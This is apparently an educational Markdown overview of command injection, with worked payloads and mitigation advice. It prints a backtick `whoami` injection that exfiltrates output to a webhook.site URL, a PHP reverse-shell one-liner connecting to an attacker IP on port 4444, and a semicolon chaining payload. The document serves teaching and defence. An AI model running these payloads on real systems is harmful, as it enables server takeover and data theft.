
# 🌐 Command Injection Overview

---

## ❓ What is Command Injection?

Command Injection is a critical security vulnerability that occurs when an application allows untrusted input to be executed as a command on the server’s operating system.  
This flaw enables attackers to manipulate commands to execute arbitrary actions on the server, potentially compromising data, gaining access, or taking over the system.

---

## 🛠️ Examples of Command Injection

### Example 1: Capturing System Information
- **Scenario:** Exploiting a network check feature by injecting system commands.
- **Input:**  
  ```
  https://webhook.site/08c29163-c569-4f1c-b964-503ad450e860/?q=`whoami`
  ```
- **Explanation:**  
  - The backticks (`) execute the `whoami` command, returning the username of the running process.  
  - Output: `www-data`, captured via Webhook.site.

---

### Example 2: Obtaining a Reverse Shell
- **Scenario:** Injecting commands into a vehicle redirection system to gain shell access.
- **Input:**  
  ```
  300)^2))}'; php -r '$sock=fsockopen("192.168.164.128",4444);exec("/bin/sh -i <&3 >&3 2>&3");';#
  ```
- **Explanation:**  
  - The injected payload opens a reverse shell connection to the attacker’s machine using the `php` interpreter.
  - This demonstrates how unsanitized inputs can escalate from basic information gathering to full server control.

---

## 📡 Techniques for Exploiting Command Injection

### **1️⃣ Command Substitution**
- **Mechanism:** Using backticks (`) or `$()` to execute commands and substitute their output.  
- **Example:**  
  ```
  https://webhook.site/.../?q=`whoami`
  ```
- **Output:**  
  The server executes `whoami`, substitutes its output (`www-data`), and appends it to the URL.

---

### **2️⃣ Command Chaining**
- **Mechanism:** Using separators like `;` or `&&` to chain commands.  
- **Example:**  
  ```
  ; whoami;#
  ```
- **Explanation:**  
  - The semicolon (`;`) ends the current command and starts a new one.
  - The `#` comments out the rest of the input to prevent errors.

---

## 🔧 Why are Input Validation and Sanitization Critical?

Command injection vulnerabilities often arise due to the failure to validate or sanitize user inputs properly. Applications should:
1. **Use Parameterized Queries:** Avoid directly executing user input.
2. **Restrict Executable Commands:** Whitelist commands allowed to run in the application.
3. **Escape Dangerous Characters:** Sanitize special characters like `;`, `&`, `|`, and backticks (`).
4. **Use Secure APIs:** Prefer libraries that do not directly interact with the OS.

---

## 🎯 Real-World Implications of Command Injection

1. **Data Breaches:** Attackers can access sensitive files (e.g., `/etc/passwd`).
2. **System Compromise:** Escalation from information gathering to a full reverse shell can give attackers control over the system.
3. **Denial of Service:** Malicious commands can overload the system or crash services.

---

## 📝 Conclusion

Command injection is a powerful and dangerous vulnerability that exploits weak input validation.  
By analyzing examples like executing `whoami` or gaining a reverse shell, this overview highlights the severity and versatility of command injection attacks.  
**Mitigation:** Always sanitize and validate inputs to prevent such exploits.

---
